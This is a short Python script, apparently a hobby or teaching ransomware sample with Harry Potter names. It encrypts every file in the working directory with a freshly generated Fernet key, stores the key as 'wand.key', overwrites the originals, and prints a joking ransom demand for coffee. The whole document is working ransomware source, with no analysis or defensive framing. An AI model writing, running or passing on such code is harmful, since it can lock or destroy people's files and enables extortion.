#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "voldemort.py" or file == "wand.key" or file == "harry.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()
with open("wand.key", "wb") as wand:
    wand.write(key)
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
                print(
                    "all your files are locked, send me coffee or they are avada cadavrad"
                )
